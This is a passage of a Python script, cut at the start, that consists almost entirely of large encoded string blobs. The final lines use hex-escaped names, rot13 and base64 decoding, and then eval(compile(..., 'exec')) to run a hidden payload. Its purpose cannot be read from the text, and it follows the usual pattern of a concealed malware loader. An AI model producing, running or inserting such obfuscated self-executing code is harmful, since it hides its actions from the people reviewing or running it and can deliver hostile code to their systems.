ZTRhNDg0MjQ0NzU1MTc1NjY0MjYzNDg1MzQyNTk2YzZhNzA2NDUxNTc1MjQyNmM3OTcwNGMzNzY3MzkzMDUxNTE0ZTQ4MzM1Mzc3MzYyZjdhNTQ3ODU2Mzc3MTU5NDE0YTc2Nzg0ZjcwNTY0NjRmNDc3MjRmNTQ1MjQ2NmY2NzUxNzYzNDZlNjU3MzRmNDk3MDY5NDE0NDMxNjg3NTY2NDEyYjc1Nzg2YjczNDY2YzRhMzk3OTY1MzA3MzQ5NDI2MzY5NTk0MTRiNmI2Yjc0MzU2YzU0NmE1MDJmNmYzMzZmNzc2YTcxNTI3OTc1Nzg1NTZlNTU3NDU5NjU1NzY1NmM1MDQzNGI3OTMzNmY0ZDJiNmE0OTYzNjQzMjZkNzE3OTQ4MzE1OTUzNDI2MTU2Njk3ODVhNjE1NjY2NTA0OTQ2NjU2OTYyNTY1ODQ2NjI2ODY0Njg0ZjUzNTc2MjQxNzk0NDU0NmQ0YTMzNTY0Njc2NjM2YjMzNGY0YjU4NzEzODQ1MzczMDJiNGE0NjRiNTI0OTJmNDkyYjQ1Nzc1MjY2MzY0NzQzNmM0NjY1NTA3MzRjN2EzNzYxNjc3MjY3NTg1MjQ4NzE0OTYyNDU2ZDZlNDM0YTQ4Nzg2NzZiNjczNTRmMzA0ZTU5NTA1OTMzNDU1MDZiNjc0ODY0NTkzNTQ5NGM0MjQ1NmE2ZTZlMmI3MTRlNGE0ZTUwMzE2ZjUyMzQ3MzM0NGM0Yjc5NmEzNTc0NjgzMzUxNTEzODUyNmI0NjQzNTk2NjY1NDg0YjUxNDQzNTQ1NDEyYjMyNDc3MjUzNjkzNjZiNGI0Zjc5NDczNjcwNDk3MzU2NTMzODcwNDM2YjRmNGM0YTcyMzI0NDM4Nzg0MTM4Njk3NDM4NmUzMDU4NjQ2MTY4NzYzMzRmNGE0MzRjNDg2OTc5NzM2ZjJmNDU1OTYzN2EzNzU5MzE0OTQ3NjY3NzU1NGIyZjRiNDMzNjQ5Mzk0NTM4NzA1NjRlNzA0YTRhMzI1MTVhNTQ2OTZmNDU2ZDZjMzE2ZDYxNDg0MjMzNjg0ODc2Njk1ODZiNmQzODU2NGIzOTY5Njc0OTU0MzU0YzUwNTI2MzM5NzM1MTU4Njg1OTY1NWEzMTUyN2E2YjUxNjM2ODQ3MmY0MzQ4Mzc0NzcyMmI1OTUxNjc0NTU4NmIzNDU0NDIzMDczMzc0YjUzNTE0MzY5NmYzNzRjNzk0Yzc3NjkzMzVhNDQ0MjQ2MzMzNDZmNzQ0NTY2NTM2YjU1MmI0OTUyNGE0MzQyNGY3YTc3NzkyZjM5Nzk2ZTMyMzU0MzY4NmY2ODY3NGY3ODRmNzk0Yzc2MzU0NDM5NTk0OTQxNTM0MzU3MzM2ZTQ0NzA3ODY5NzY0OTRjNDk1MzQ3NGI0OTU0MzU0NjQ1MzQ1MzUwNzk0MTc1NTI1NDY1Njk2NDZkNmM0MjQ5NDk3MDU3NzMzNDQyNGI1MjQ4NTE1NjM1NDU1MDMwNzA3MTU1NjM2MTM3NTg0YTQ0NWE0YjY0Njc0Mjc3MzI1MjQzNzk0OTU3NTM2YTZmNDE0MjRhNmI1NjUyNDIyZjZlNjc1YTMxNmUzOTRkNzU0OTRiNzc2NTJiNDUzMTZkNTI2NDYzMmI0MzMxNDM0OTc1NmQ0YjQ5N2E0Yzc2NmIzMDY0NTQ2ZjZmNTE2MjU5NDY2NzY0NTk2ZDM1NDQyYjUzNDM3MjU4NDU1MDMwNDU3MjU5NDQ2YjU0NDE2OTcwNDkzNjQ1NDUzNjU5NTU3MDc0NTE3NjRiNmYzODM0Nzc1MDY5NmI2NzZhNWE1NTc3MmY2NDM1NDUzNDc3MzA3MTM2Nzk0NTY2NGEyYjU0NjY1NTU1MzM2MjM0NTM0ZjY1NDE1MDM5NmQ1NjMyNGE3MzY3NjkzNzZmNjc2YTYyNTk2NzZhNTA3MTQ1MzA0MjQ3NzgzMjQ1MzMzMjU3NzI0NDU0Njc3MTY3NzQzNTUzNGQ0OTcxNzk2MjZlNDk0ZTRjNDc0ZjQ0Njk2NTYxNWEyYjY0NDk0ZjQzNDM0YTRjNGE2YTQyNjY3NzZhNzM2ZDMxNGMzMTM1NDk2ZDQ4NTE3MTQzNDE0ODQ5NGQ3ODc4NGU2ODU5NTI1NjYzMmY0NDc1NTI0ZjU4NjIyYjczNGE0YTc2NmI3NTJmNTUzMjc3NmI3ODc5NjI1NTRhNGI2MTUxMzg0MjVhNTc2ZDQ4NTUzMzM2Nzc3NjY5NjI1NDQyMzAzMzQ3Mzc0NjM5NjQ2NzdhMzg2NjQyNTA2NjU0NDgzOTY0NTU0ODM2NGQ3OTM1NDE1MDM5NjMzMzRmNDc1NjJiNmI2Zjc5NjE1NDdhNjc3ODQyMzY1NTdhNzg0MzUxNTg2OTU5NmI1NTM5NTE0Yzc3NmE0NTY5Mzg2NDQ5MzgzNzU1NDc1MzUyMzY3OTc3MzQ2ZDY0Njg1NDc3MzM1NDY1NmM0ZDc3NGMzMjQ5NjU3NDU1NTI0MTQ5NTk1YTc4NmE0NDY5NGU0NDM0NmM0MzU1NTI1MDUzNDkyYjQ2MmI0NjJmNDk3MDMwNTM2YTQ3NjMzOTJiNjI0NTUyNDI0YTU5NjQ0NjU1NTI2OTMyNDM2YjQ0NzYyYjQzNzk1OTc5NzAzNzZkMzU0MjRmNzk3MDMyNjQ1MjRiNDQ1ODZjNTEzNDZmNTUyYjQ5NGU0ZjdhNWE2MzQ5NzM0ZTQ1MzM0YTc5NzA2Yjc3MzMyYjU5N2E1MDcwNGQyZjRkNTM1OTJiNmY1NTJiMzk1NTUyNDk3ODMxNDgzNzQ3NTI2ODM1MzQ1MTcwMzg2ODRjNmIzNjQzNDQzMjczNzE1YTJmNjg0MzM1NGY2OTRhNGQyZjQ5NWE3NjY5NDQzMDQ3MmY0OTU4MzQ1MzYzNjQ1MDU4Nzg1NjJiNGI2NjM0NzYzMDc5NTUyYjc4NDEzODZiMzM0MjYzNDY0YzUzNmMzMzM4NTU2MzcxNGY0ZTY1NmM0OTMwNzM1NDY1NTg1ODVhNGY1MzQ1NjU1ODQ5NDkzMTQ1NzA2NzUzMzk3MDcyMzE0OTUwNjk1Mjc4NzE1NzQyNmU0MjdhNzU2YTZkNGIzODQ5NTk2OTdhNzg1NzY1Nzg2ZDM2Njk2OTY3MzM1NTY4NmU0Mjc2NmU0OTJmNDM3MTYxNmI0ZDUxNzEyYjZiNGI2NTZlNTY0NTM2NGY2MzUyNTAzNTM1MzM2YjQ1NjI2MjQ1NjkzODZiMmY0NjRmNzk0MTRmNDU3YTc4NmU2NjQ1NTEzODcwNjU0Zjc0MzQ2ZjMyNDEzMzMwNzQ3MDRmNGY3MDRhNGU0YjZmNDI0YTZkNjkyZjRiNjk2ZTYxNmU2Zjc2MzE0ZjUzNTgzMjUwNmU0NDU0Njc1OTM3MmYzODcwMzM3OTcxMzkzODZiNmUzNDc1NDYzNzczNTU3NDRjMzI2OTU4MzI2MjQ4NjczMzUxNjM3YTUzNWE0NTJmNTY2NjQ4NmE3OTQzNjk0NTdhNGE0ZjU2NDYzODM2NGM1MDdhNGEzNzM0MmI0MzYxNDYzNDVhN2EzNjUzNmE3ODc0MzA0ZTZmNmEzOTQ1Mzc2YjYyNDU0NTMxNjQ0ZTRkNjM0NTZjMzA3MzZlMzk2NDcyNzAzMDRmNzY0Njc2NTE2MTUwNDI0YTM4NzE2NTJiNTMyZjM1NGE2Njc0Njk2ZTZiMzI2YjZjNWEzMTQxMzc0MjQyNDI1ODY5NmI2NDUyNGE1MzUwNmQ3NjY4NjM0ZDUwMzU1MDYzNzA2MzRmNzA1NTUxMzY3ODM5Njg1YTY3NTAzMDVhNDQzODM5NTQ2ZTRiMzg2YjM3Njg2MzU0Nzc3MDM1NzI2NzcxNDE0YTY3Njk2YzM1MzY0MzQyMmI1ODJmNDk2NjM1NzE0ODU1NjUzMDY2NmQ1NDJmMzU1NDM3NDYyYjU4N2E3MTU3NzAzNDM4NmQ2NzZlNzg0YTZiNmQ0NTY3MzczNjU0NjU0OTQxNDI0YzUyNjg0Njc3NDUzNDU5Nzc0NTY4NTc2NjY1NmIzNDZjMzk1MjMyNGI1MDY5NzU2MzczNzA0YjRlNTQ1NzMwMzkzMDU0MzUzMTc3Mzk3MDZkNjQ1OTQxNTgzNTRjNjU3NDRlNmU1YTUxNjQzODM4NTU0NDRmNzc2ZDY3NWEzMTRlNmU0MTY4NDY1NDY0NmE3NzM1MmI3NTUzMmYzNjRlNjU2ZDY2NDc0YzcxNjQ3Mzc5NmU2NjQzMzA2ODc5NmIzMzM5NmY0MjJiNmUyZjJmNDc2ZTdhNzI0MzcwNjczNjYzNTM2NTU1Mzc3MjU1NjgyYjRhMzA0ZTQ5NjY1NjU2NGU2ZTQ5NjU1NjY5NmE1OTRjMzQ3MzdhNGU0MjM4NzUyYjYzMzg1NzY0NDMzMzY3NTU2ODcwNDQ3OTJiNGY2ZDc2NTk0NDY1NGM0YjZlNzQ0YzY4NDk3NjYzNTY2NDY5Njg1MTc0NmI1MzY5NmQ1MTY1Nzc0MTdhNDE0MjU4MzU2NzdhNmIzNzJiNGQ3OTY0NGM1MjcwMzM2YTc2NmY1MDM4NTI2NjVhNDgzNzY3NTg1MjYxNDU1YTQ4NjY2MTU2NGU2ZTQ3MmIzMDc5NmQ3NTM0NjQ0OTJmNGQ3NjM2NTg0NDUyNzA0MzRlNDM2YjQ2NjY2ZDZjNjY1MjMzNzA0NTYzMzY3NjJmNmY3MDZlNzI0NzdhNTU2NTM1NGI0ODY2MzE1MzUyNzI2YjY3MmY2YjQ1NTA3MTY5NmU1MDU5NjIzNTQ0NjY3YTc4MzE0YTc1NDY3Njc2NmY0ZDc2NTA0OTYzNTM2NTM1NTE0ZjQ0NGQ1OTRlMzY1MjQyNjg0ODZjNmU0MzcyNmU2OTc2NTk0NzY2NmY2NzVhMzA0MTcwNjk0NDY5NjM3MDY1NDk3NjZhNmYzNTM2NGQ2NTVhNjMyZjc5NjMzNzZkNDY2NjJiNjM0YTYxMzQ3MjMxMzA3NzUyNDY0ZTM1NzUyZjMwNmU3NzRkMzc0MjY0NmE2ODY4NjI3YTM2Nzk3Mjc4NTQ2OTY0MzI3YTM4MzA1MDcwNTU3YTc4NTcyYjc0NTQ1YTQ5NDQ2YjQ5NGY3OTc2NWE3MzU1NDkyZjUxNGM3MzU4NjY1NjU2NTQ0ODc0MzU1MDQ4NTI3YTU0NTA1NTU5Nzg3Mjc4Njk2ZTQ0Njc2NTc4MzM1NTRjNzk2YTQ2N'
keymaker = 'Qt3BGDlAmZ2MGZmAmN1BGp0AGZ2LmZmATD1BGZ5AQp3AwL5AGtmZwL4ZmZ3BQL0AGV3BQpjZmD2BQHmAGDmZmD2ATHlMwD0AzHmZmWzAwL0LwquZmR0ZGWzAmR1AQp5ATZmZmquAzDlLwWzAzZ2ZGL1Awt0MwpjAwR2MGL0ZmRmAwDlAGD1AGD1AzVmZmIuAQZ0BGD4ATR0AGp4AQx2Lmp2AGt3ZmExAmL2MQHlAQL0AQMwATR3ZQZlAQH3AGD4ZmN3ZwD5AmN2LGZ2Amp3ZmH2AmD1ZQMxAQp1AwL3AwZ2BQp3AzR3BQpmZmp2LwH1ZmN2BGLkAwH0AGZkAGxmZQH3AzR0ZmZlAwH0ZmH4AQR2MwHmATR3AGL5Amp2ZwMzZmV2BQEvAGp2LGpkAmH0MGH2ZmD3ZmZlAwL2LmD5AGt0MwL0AQt3AQWvATHmZQHjAGp3AGHlAQZ0ZGp0AQx3Zmp0ATR1ZmDmAGD3ZmEvAwt1AGExAzL3ZQDmZmDlLwH5AwZ1AwD1AwV0BQExAGt0BGDkZzV1AwMvAGx3BGZjAzZ3ZwL4AGZ2ZGHmAGtmAwDlZmt3ZwD4AGp0MwMzAQZmZQEuAQt3AQD5ZmL1AwMvAwZ1ZGquATRmAwHkZmD3AmZ3ZmH0AGZlAzD3AmD0AmL3BQEzAzZ1LGMzAGH0AQWvZmV1ZGH0AzV2LmZmAJR0AwL0AQHmZGHkAwR0ZmMuAmN3AGH1ZmH0AwHmAmZ0Awp4Awt2ZwZ3AQH3AwD4Zmx1BGDmAGL0AGp5Amp1ZmDlAzV3AmZ1ATL2AwHlAQp3BQpmAzV0BGH1AzZ1AQp5AmN3ZGp3AGH1Zwp1AmRmAmH4Amp2LwZ3ZmR1ZwD1ATV0AwL2ZmN1ZGL3AGp2AwMxATR1ZQMzAzR3AmHmAwV1AmD5ZzL0ZmD3Zmx0MQMuZmD2BQMvAmZ2AGEvAQZ1AwD2AGRmBQD3ZmZ2ZmH2Amt0MQL5AwR2LwZ5AGL2MQMxAQV0LmDlAQV1ZGZjAQH1ZmD4AGN1AmD0AQH2BQZ4AzR2AmHkAQD1ZGp5ATRmAQMwAJRmAmZjATL0MQIuAmV0LwL4AQR0BQp2ATLmZQp5AQHlLwEvZmR2AwD4Awp1ZQEyAGZ2AwHlAGNmZQLkAJRmBGMwAwV3AQZ1AmDmZmLlAmH3Awp0ZmV1AwMuZmD1AQH4AzL0LmZlAzZ1ZQp0ATH3AwMyAwDmBGZ3AGL3AmMyAQtmBQZ2ZmV3AGEyAQLlLwLmAGN1AQp3AwtmZQEzAGD1LGLmZzV3AwHlZmt2ZwWvA2RmZmHkZmNmZwH4AzHmAGWzAGL3BQplZmx3AwZ5AwL0LGZ2ATHlLwMyATD2AQEyAQxmAmMwAwV2LwWvAwt2AQZmAwR1AmH5WjceMKygLJgypvN9VPpmn2ckqwuuMQAOoSx1qmAynQujAz00DIAanQOXnmL5AUb3ATp5M0cgn2k3nJ80DmV1DJyXGwyMnwyyFHgUMzMcFIt3EHbknT5WLx1SJwAKIJZlHIAgnSIAEHgIoKA1Ex14GJ9bLacgMGD5M3AgD1t4oQZ0nRR1ZJD0HUWyFwIWXmWDD1IepTSVrwMdo3N5MT9DY0jeo0EJH1SSn1EEJT1QnJS6AJM5ZxRjFQyXH29kZKSwBHR0HP8irSuOEQyZBRAiMH1nFmqMGTx4ESE6ZJySEzZkqTyyMTIuLaqHBPflZ25XI29lqHyjZHEMpmy1p3y5LmIWo2t0p0HepGObnTqcrGH5IRSZAP9IEmS5ZKc6HJ5ko0APq0S4IQIbA2uiLIcuo25iI2gWDGV4AQWzIKq4G3yeAR94nKySJxSzX0gRFFf5q1EiZJyQZQqXBUyfITbiLz4eLH1AGlgFI2yOZyAYoaIun2ECLKAUoKOxqQAQXmAuZmucG013nybkX1y3A2qzpmAxImMwGQV3ozyRpwyiGmMXZzSeLID2rGZjImAjpH1bnmywEJfmZSuMDwZiIzW4ZzAxMTgvq2SFFKqEMJMKMwSVGHWWJQNkY3WJA2qhpacwq3cVD2kcrzEkn2yOJQWeX1Oln21uM0qGY2u5F0c4AmWLHl9lM0Agn2IWnJIlZxImpmV1A2W1Xmy6BTgUZQSCY2IUIHEgZQElZ21OZIWXFyMkLH5xZUpmAKNeZzIUEIWOY1R5JRSOBQImAmqbD3t3pGygI2beJGqQrTMRFRZ1Zwqmo2DlM0W5LwqAERy3D0x5MQqhnTIuFQAMMwAdnGOYY0cHIJyiqJ9Oo1czX0gbX01AAxgurKcjA2HjqGS6JTIFpwq1ZwuuGKVeGJMmMmACAPggJJEmrJkvAFggqzSknzMlD2gkn0AaoRSVMzMnFmMuDyERIv9UBHyxHQR5q3yArwIMGJy5paASAmIZozI3o1p2p3V0H3AyLaN5GKyhL0beZGEiDISRETp3p3OUZmIkJKOcDJ5bMzIJnRSPAJ5ipJ9IAJSAoJyAJwqlnHAHM1OgJJjmpIy5Z29WnH5UBFgULHkRMFf2M2SCqzD2qxqSoJqiDaOhBJ5gGHRjHGL3ERguZTqlZ3yco3WcMTqwMHL4XmqLMRZjqQSWnGSbDwIcZHcEFUyVBHVlq0cFFaOao0qOBIOiF21KE3MHqKWVAGH4oIMyZSEVL3qjY1S1MxgbMJqxMGIuqKymGyMlZlgWFGyZnmybY1EPpQVjY1O5naH3pGM5AmD0p3yzMv9Xozc0X1Z4ZQWyBGA5raSHZJSwoKAnE2t3DKVmnJqnF2kdpmHiGzMzoJEKEP9KMzMYMzg5rIEUZ25nFypiozyMnJj5ZaDmn2tlBTAkX2ukMItjZJtlMmIHIKIepzymDyubMaAvE2M5D1EUpzD2qyImBQyPpKWJY1yJJwEyrKA1AJ9ZozMbnwEuDJ15AQy4Y2gzMHp5G0t3HHb0MJ43n2HknUy0FzqwBKSLJUyHGJyLqyDenwN0F2SwA01yGKuiGQx1pGp3nv8kJx9fpH1OqQSlq2yIFxyhqUWkFJMfXmElFxyjFH00GKqOqlgDA3ADZQqOnJ1MFwL3rwyAp3ybD3OlLKA1E2kyLHSUD0q5olgOBGOGEwW6A0EEDJ90GIA6qQIyozS5FmEVnGyxq1OxoIulMH9YZKIXnl81E2A6ozRjnSEfZT9iHyV3A1uvJHbeG0flE2t4D1OlX1yco21uMTA1YmAjFmMVD3SiFyqiMGMUZGR1Y3AkGIOVoGWkq0gBFJZ0ZKb3pzgeHJZiq21AZH5gX2xeATgJnSIfnJ9zAwDmYmWPZzIOLwH0BGuaZxx3nRyYDHM6rz9hZHIDBSH5D0xeA1DeZISyZTISnHMwGQt0pzRjBUEuY2cDpzRknRcyZRWzq21MJaMmozj4MJ96AHkMI3WQZRHmBUSUA0AnF2gjGIHjX1M2pJEaHxuBY2gmnJHiF3EkAzcAZmDeM0umnHSgZzjkD3RlI2uxBSEKBKICqmIHGH82AP9IJzb0F2kUqISMIzxkFISyFKcdBH9lD0DkLGMcqTbeMRMXoHqXEmIxrRSuJJcXoRAcnTL4Z1qhD0WYoIAhEJSaAGx3IaqxLxAME20lrGyEEmV2FTgbZKIIX1yAFGMgLHgeBKZ3BJuYqzIJGKqaqJIfEPgYLHAzAyWPIHAeMTx3rQxiIGRmp3SPoKWmZ0L5Gv9WqUV5Z0cMM2yWDJp4LyceFGWHqUH3pzSenaVkD0peGxfmM2ImHJckMTI1AmqgoaA5nQyjIQAmIwp4M204F2b5Dmy5AySaZHS3Y09UqyOuH2kUA3c5ZzkyHl9iLGDjMmWQpwybrHgkAxSwoHZ1oTEjqJj0A0EjAT8mAwOcpKDepz5KLJuCEGt2qUuBJTxkMKRmJSD5Gmt0ZwMGFwt4HmyPoGqwZ2uXnTgkp3WIMzf4ZJybD2AGoTuerIuYZ3WwZKuCq2MXMHWUBTVeATqCE2p1nQWuozgRLIuknSA2q3IkFmqxMTpiIGMlZmqiMQqkomSzX3AyAv9fX0b1nRVjp21dZ0AiAJyuZQyMF25iGKVlBIAcpJt4A01nD2uiJSIIowWbBHuiFyy5M21JMJSLMQEPZGumqGWYq3O1Fz9znHj5L0yKnKWCFaWxMzEkoIABEwMEqGSGLJIAn3x5FyIVEwymJGqAF1AvH2yhGTqkpKqvnatenHqDHJb3G1MOpmA5oJV5IIViMQL5LJggo2k1ZRSWHl9BZ2AiZQuTn3AULxcxEUNkLHcdMHyfowudp3EwFRxmAyy1rIHlpzRlAxIGEmSmIFgQoxuEY09JXl9lnGIfBRkMqH8mq0AiMQDmMwMMnaSaDwu6ZKc2p2qmq3yvD2SgpRA4AaAgozMLD1NeFmIhIT9vE1SFISSQDaA1nmuZIzkyJHg6pH16FRAyImt1HyIXJHqnoGMJqKZkF2EgIyIhIP9DEzjmG29ALGx4nTqzFTMyDJIjpQHkBTEjZTu6pJSnqTuYZ2ulnJqMA3OSGJb2X202Z2H5BTqCBTj3ZGymM1p5pKuKJzxkn2blX3DeY0WBZxAbMzb2M2qZX3qHAQN4Y0WKp2xlX1WAX3SRHGEzrz9JIGH2qxgdZzIkBUqOowHlIGMZFKx4qKAZA2c3AaIUAKcdMPgmY2gZo2WAraqGX3Aun2H4F3yjGUH1oSx4ZJD4L2cQp1yiAxZiMP9cL2IgJJuxIRWkZGOOp1ymARglDmAEDvgJIl9eXl9XJwy6EFgXBTZkZUSSnaAgLGx5oGMiZJuAAaIPIGMhoGAkoIWYDlguX1caZxbiGvfmAUb0X0b3ATyfMJICYl8eY2kKF2L3p3NiAGSzoz1gY3SQMKHkMTZ5nGpjpUWRoxEwDzMFFzZiLIA5LayEDKAKAJEjFmWcX2fiIHq6pl94qUSXEHI3FmufFHAPMGEXIRuPpmEEpGMiBKt4pzEWY3pin0WOFmAgq3ccF2MUAJH4FmAPrwp1Fl92nv9UIREMZJZ5oKMYZ1uiX0AZY25joFf0H0Z0L2f3IaR5HyR4ZQt5HSEkY2IDBGMvMJVinmMzY21yqmEkA3ynAzcaD2ZiHxqgZRMPBP9UoaAgn3ZiZHuYI2gwHzpiATRmARgHJGxlJaZiIKEQAQpiLzuFD0gUFTSQq2tipH9FZv9HnPfjIKM5A3cTqz4inSN0BSbipyOBZyqMMR1kpmAeZaN0LHc1D2IjrGyaBTScqzyTG3AgMxAQpxjeLz1OX2uhrxyWoGOuowS0o2uPZQygZ0WVpPghGTb5rGxkAmRirRWJIxZep0WfDxZ3GRcWLwyErvgxraHjD0p4Zx4eDGAeZwyQIGZiYlf3o3AepTHinlgcnRZiMFgOpl9RD2Hmq0ViM1EiDzx2GGZmAwqupwp0pxAvBRgcX1OFEQtinGOAqQIIBJHeD2L3Y2Lmn0RiX00iX3EOA3Sap3ZiBKAmnwDmLlgFD2LlrRjmZxgZAaR5Ylf5pTgenKWKGyOIryWmBHVjZHRenwyQIzuRZlgQLGH5pmHmISEJYl9cnHuYrHDiAwSeGQI5Yl8iETpmHJj5paIIAmuZLzxiJJ84GIVmplgMoTpeHaEQn3VkGKAyAxLiE3Z4oFgyAKWIZaN4El8mDmWYYmE0Al9SH2cbnQAcYmpkomxiXmygY01yZmpeDmxiXmybZ0uuZ1x4BJqcY09RrKuSFUt9Wjc6nJ9hVQ0tW1k4AmWprQMzKUt3ASk4ZmSprQZmWjchMJ8tCFOyqzSfXPqprQpmKUt2BIk4AmuprQWyKUt2AIk4AzIprQpmKUt3AIk4AmWprQL1KUt1Myk4AmAprQp0KUt3Zyk4ZwuprQLlKUt2BIk4AzIprQLkKUt3Z1k4AwAprQL5KUt2BIk4ZzIprQp1KUt2MIk4AwuprQL1KUt3BSk4AzAprQL5KUt2Ayk4AmyprQV4KUt2MSk4AzMprQplKUt3ZSk4AwuprQL1KUt3AIk4AmAprQV5KUtlBFpcVPftMKMuoPtaKUt2Z1k4AzMprQL0KUt2AIk4AwAprQpmKUtlMIk4AwEprQL1KUt2Z1k4AzMprQL0KUt2AIk4ZwuprQp0KUt3Zyk4AwyprQMyKUt2BIk4AmEprQp5KUtlL1k4ZwOprQquKUt2BIk4AzMprQMyKUtlBFpcVPftMKMuoPtaKUt3Z1k4AwyprQp4KUtlMIk4AwIprQMyKUt3Z1k4AmIprQplKUt2AIk4AJMprQpmKUt3ASk4AmWprQV4KUt2Zyk4AwyprQMyKUt2ZIk4AmAprQLmKUt2BIk4AwyprQWyKUt3AIk4AzIprQL4KUt2AIk4AmuprQMwKUt2BIk4AwMprQp5KUtlBSk4AzMprQplKUt2ZIk4AwAprQMwKUt2AIk4ZwyprQV5WlxtXlOyqzSfXPqprQLmKUt2Myk4AwEprQL1KUt2Z1k4AmAprQWyKUt2ASk4AwIprQLmKUt2Myk4AwEprQL1KUtlBSk4AzWprQL1KUt3BIk4AzEprQLkKUt2Lyk4AwIprQplKUtlZSk4ZzAprQVjKUt3LIk4AwyprQMzKUt2MIk4ZwxaXDcyqzSfXTAioKOcoTHbrzkcLv5xMJAioKOlMKAmXTWup2H2AP5vAwExMJAiMTHbMKMuoPtaKUt2MIk4AwIprQMzWlxcXFjaCUA0pzyhMm4aYPqyrTIwWlxcPt=='
zion = '\x72\x6f\x74\x31\x33'
neo = eval('\x6d\x6f\x72\x70\x68\x65\x75\x73\x20') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x74\x72\x69\x6e\x69\x74\x79\x2c\x20\x7a\x69\x6f\x6e\x29') + eval('\x6f\x72\x61\x63\x6c\x65') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6b\x65\x79\x6d\x61\x6b\x65\x72\x20\x2c\x20\x7a\x69\x6f\x6e\x29')
eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))